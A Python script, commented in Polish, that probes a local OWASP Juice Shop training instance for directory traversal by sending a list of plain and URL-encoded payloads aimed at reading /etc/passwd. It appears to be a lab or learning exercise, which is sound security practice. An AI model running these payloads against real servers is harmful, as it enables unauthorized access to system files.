import requests  #importujemy bibliotekę do wykonywania zapytań HTTP

#adres lokalnej instancji OWASP Juice Shop
BASE_URL = "http://localhost:3000"

#endpointy, które testujemy (folder ftp jest znany z podatności)
endpoints = [
    "/ftp/",
    "/ftp"
]

#lsta payloadów Directory Traversal próbujących sięgnąć do pliku /etc/passwd
payloads = [
    "../../../../../etc/passwd",
    "/ftp/../../../../../etc/passwd",
    "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\..\\..\\etc\\passwd",
    "%2e%2e%2f" * 10 + "etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
]

#nagłówki HTTP
headers = {
    "Content-Type": "application/json"
}

#główna pętla testująca wszystkie kombinacje endpointów i payloadów
for endpoint in endpoints:
    for payload in payloads:
        #tworzymy pełny URL łącząc BASE_URL + endpoint + payload
        url = f"{BASE_URL}{endpoint}{payload}"

        print(f"Testuję URL: {url}")  #wypisujemy testowany URL

        try:
            #wysyłamy żądanie GET do serwera
            response = requests.get(url, headers=headers, timeout=5)

            #sprawdzamy, czy odpowiedź zawiera charakterystyczną frazę z pliku /etc/passwd
            if "root:x:0:0:" in response.text:
                print("Znaleziono zawartość pliku /etc/passwd!")
                print(f"URL: {url}")
                print("Fragment odpowiedzi:\n", response.text[:500])  #pokazujemy fragment odpowiedzi
                exit(0)  #kończymy działanie programu, bo znaleźliśmy podatność
            else:
                print("Brak nieautoryzowanego dostępu.")

        except requests.exceptions.RequestException as e:
            # Obsługa błędów połączenia lub timeoutów
            print(f"Błąd podczas zapytania: {e}")

print("Test zakończony. Nie znaleziono podatności Directory Traversal.")
